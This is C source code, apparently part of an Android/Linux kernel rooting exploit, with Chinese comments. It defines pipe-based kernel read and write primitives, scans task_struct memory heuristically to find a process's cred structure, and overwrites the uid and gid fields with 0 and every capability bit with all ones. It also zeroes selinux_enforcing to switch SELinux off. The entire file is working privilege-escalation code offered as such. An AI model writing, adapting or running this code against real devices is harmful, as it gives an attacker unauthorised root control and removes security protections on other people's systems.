#include <unistd.h>
#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <fcntl.h>              /* Obtain O_* constant definitions */
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "common.h"
#include "getroot.h"


/* 读取内核数据 */
int kernel_read(void *addr, void *buf, int len) 
{
	int result = -1;
	int pipefd[2];

	if (pipe(pipefd) == -1) {
		printf("kernel_read pipe failed!\n");
		return -1;
	}

	errno = 0;
	if (write(pipefd[1], addr, len) != len) {
		printf("pipe write failed, errno: %d, %s \n", errno, strerror(errno));
		goto err;
	}

	read(pipefd[0], buf, len);
	result = 0;

err:
	close(pipefd[0]);
	close(pipefd[1]);

	return result;
}

/* 修改内核数据 */
int kernel_write(void *addr, void *buf, int len)
{
	int result = -1;
	int pipefd[2];

	if (pipe(pipefd) == -1) {
		printf("kernel_write pipe failed!\n");
		return result;
	}

	write(pipefd[1], buf, len);
	if (read(pipefd[0], addr, len) != len) {
		printf("pipe read failed\n");
		goto err;
	}

	result = 0;
err:
	close(pipefd[0]);
	close(pipefd[1]);

	return result;
}

/* 
 * 搜索task_struct中的struct list_head tasks字段，返回偏移量
 * 在定位tasks时，由于下面的成员pushable_tasks.prio在手机上总是0x8c，
 * 因此可以作为标记来在init_task地址处开始搜索。同时在prio前后几个字段
 * 均为内核函数指针也可作为判断
 */
static inline int get_tasks_offset(void *buffer, int buf_len)
{
	int i;
	int offset = -1;
	long *step = buffer;
	int count = buf_len / sizeof(long);

	for (i = 0; i < count; i++) {
		if (step[i] == 0x8c && (i + 3 < count)) {
			//printf("   0x%lx, 0x%lx, 0x%lx, 0x%lx, 0x%lx, \n",
			//			step[i-1], step[i], step[i+1], step[i+2], step[i+3]);
			if (step[i - 1] & KERNEL_START && 
				step[i + 1] & KERNEL_START &&
				step[i + 2] & KERNEL_START &&
				step[i + 3] & KERNEL_START ) {
				offset = (void *)&step[i] - buffer - ADDR_BYTE_LEN*2;
				//printf("   find value: 0x%lx, offset: 0x%x\n", step[i], offset);
				break;
			}
		}
	}

	return offset;
}

static inline int is_cpu_timer_valid(struct list_head* cpu_timer) 
{
    if (cpu_timer->next != cpu_timer->prev)
        return 0;

    if ((unsigned long)cpu_timer->next < KERNEL_START)
        return 0;

    return 1;
}

/* 
 * 搜索task_struct中的struct cred字段，返回偏移量
 * 根据cpu_timers中链表不为空和cred、real_cred相等作为特征来搜索
 */
static inline int get_cred_offset(void *buffer, int buf_len)
{
	int i;
	int offset = -1;

	for (i = 0; i < buf_len; i += sizeof(void*)) {
		struct task_struct_partial* __kernel t = (struct task_struct_partial*)(buffer + i);
		if (is_cpu_timer_valid(&t->cpu_timers[0])
			&& is_cpu_timer_valid(&t->cpu_timers[1])
			&& is_cpu_timer_valid(&t->cpu_timers[2])
			&& (t->real_cred == t->cred)
			&& ((unsigned long)t->cred > KERNEL_START)){
			offset = (void *)&t->cred - buffer;
			//printf("   cred offset: 0x%x\n", offset);
			return offset;
		}
	}

	for (i = 0; i < buf_len; i += sizeof(void*)) {
		struct task_struct_partial_ptracer* __kernel t = (struct task_struct_partial_ptracer*)(buffer + i);
		if (is_cpu_timer_valid(&t->cpu_timers[0])
			&& is_cpu_timer_valid(&t->cpu_timers[1])
			&& is_cpu_timer_valid(&t->cpu_timers[2])
			&& (t->real_cred == t->cred)
			&& ((unsigned long)t->cred > KERNEL_START)){
			offset = (void *)&t->cred - buffer;
			//printf("   cred offset: 0x%x\n", offset);
			return offset;
		}
	}

	return offset;
}

int modify_task_cred(struct thread_info* __kernel info) 
{
    unsigned int i;
    struct cred* __kernel cred_addr = NULL;

    struct thread_info ti;
    struct task_struct_partial* __user tsp;
    

    if(kernel_read(info, &ti, sizeof(ti)) < 0)
        return -1;

    tsp = (struct task_struct_partial*)malloc(sizeof(*tsp));
    for(i = 0; i < 0x1000; i += sizeof(void*))
    {
        struct task_struct_partial* __kernel t = (struct task_struct_partial*) ((void*)ti.task + i);
        if(kernel_read(t, tsp, sizeof(*tsp)) < 0)
            break;

        if (is_cpu_timer_valid(&tsp->cpu_timers[0])
            && is_cpu_timer_valid(&tsp->cpu_timers[1])
            && is_cpu_timer_valid(&tsp->cpu_timers[2])
            && (tsp->real_cred == tsp->cred)
            && ((unsigned long)tsp->cred > KERNEL_START))
        {
            cred_addr = tsp->cred;
            break;
        }
    }

    free(tsp);

    if(cred_addr == NULL)
        return -1;

    struct cred cred;
    if (kernel_read(cred_addr, &cred, sizeof(struct cred)) < 0) {
        printf("kernel_read fail\n");
        sleep(-1);
    }
    
    cred.uid = 0;
    cred.gid = 0;
    cred.suid = 0;
    cred.sgid = 0;
    cred.euid = 0;
    cred.egid = 0;
    cred.fsuid = 0;
    cred.fsgid = 0;

    cred.cap_inheritable.cap[0] = 0xffffffff;
    cred.cap_inheritable.cap[1] = 0xffffffff;
    cred.cap_permitted.cap[0] = 0xffffffff;
    cred.cap_permitted.cap[1] = 0xffffffff;
    cred.cap_effective.cap[0] = 0xffffffff;
    cred.cap_effective.cap[1] = 0xffffffff;
    cred.cap_bset.cap[0] = 0xffffffff;
    cred.cap_bset.cap[1] = 0xffffffff;

    kernel_write(cred_addr, &cred, sizeof(struct cred));

    return 0;
}


/*  */
int patch_cred(void *init_task, char *task_name, void* kaddr, void* uaddr, int size)
{
	int result = -1;
	int cred_off = -1;
	int tasks_off = -1;
	void *next_task = init_task;
	char buffer[0x1000];
	void *task = buffer;
	int len = sizeof(buffer);
	struct list_head *tasks = NULL;
	char* comm = NULL;

	if (task_name == NULL || init_task == NULL) {
		return result;
	}

	/* 根据内核中的task_struct的双向链表struct list_head tasks来搜索到exp进程 */
	while(1) {
		memset(uaddr, 0 , sizeof(uaddr));
		//printf("   kernel task addr 0x%lx \n", (unsigned long)next_task);
		/* 读取task_struct结构体内容 */
		if(kernel_read(next_task, kaddr, size) < 0){
			printf("   kernel_read failed! 0x%lx\n", (unsigned long)next_task);
			return result;
		}
		//show_bytes(uaddr, size);

		if (tasks_off < 0) {
			/* 搜索init_task中的struct list_head tasks，返回偏移 */
			tasks_off = get_tasks_offset(uaddr, len);
			if (tasks_off < 0){
				printf("   get_tasks_offset failed\n");
				break;
			}
			//printf("   tasks_off = 0x%x\n", tasks_off);
		}
        tasks = uaddr + tasks_off;

		if (cred_off < 0) {
			/* 搜索init_task中的struct cred cred，返回偏移 */
			cred_off = get_cred_offset(uaddr, len);
			if (cred_off < 0){
				printf("   get_cred_offset failed\n");
				break;
			}
			//printf("   cred_off = 0x%x\n", cred_off);
		}
		comm = uaddr + cred_off + ADDR_BYTE_LEN;

		/* 根据进程task_struct中的comm字段判断exp进程 */
		if (strcmp(task_name, comm) == 0) {
			//printf("   task name: %s\n", task + cred_off + 8);
			//printf("   task name: %s\n", comm);
			void *cred_addr = (void *)(*(long *)(uaddr + cred_off));
			struct cred* cred = uaddr;
			/* 读取进程cred内容 */
			if (kernel_read(cred_addr, kaddr, sizeof(struct cred)) < 0) {
				printf(" kernel_read fail\n");
				break;
			}

			cred->uid = 0;
			cred->gid = 0;
			cred->suid = 0;
			cred->sgid = 0;
			cred->euid = 0;
			cred->egid = 0;
			cred->fsuid = 0;
			cred->fsgid = 0;

			cred->cap_inheritable.cap[0] = 0xffffffff;
			cred->cap_inheritable.cap[1] = 0xffffffff;
			cred->cap_permitted.cap[0] = 0xffffffff;
			cred->cap_permitted.cap[1] = 0xffffffff;
			cred->cap_effective.cap[0] = 0xffffffff;
			cred->cap_effective.cap[1] = 0xffffffff;
			cred->cap_bset.cap[0] = 0xffffffff;
			cred->cap_bset.cap[1] = 0xffffffff;

			/* 修改进程cred内容 */
			if(kernel_write(cred_addr, kaddr, sizeof(struct cred)) < 0){
				printf("   kernel_write failed!\n");
			}
			//printf("   kernel_write cred ok\n");
			result = 0;
			break;
		}
		/* 搜索下一个进程的task_struct */
		next_task = (void *)tasks->next - tasks_off;
		if (next_task == init_task) {
			printf("   can not find task\n");
			break;
		}
	}

	return result;
}

int patch_selinux(void *addr, void* kaddr, void* uaddr)
{
	int selinux_enforcing = 0;

	*(int*)uaddr = 0;

	if (addr == NULL) {
		printf("   kallsyms_lookup_name selinux_enforcing failed\n");
		return -1;
	}

	if (kernel_write(addr, kaddr, sizeof(int)) < 0) {
		printf("   kernel_write fail\n");
		return -1;
	}

	return 0;
}
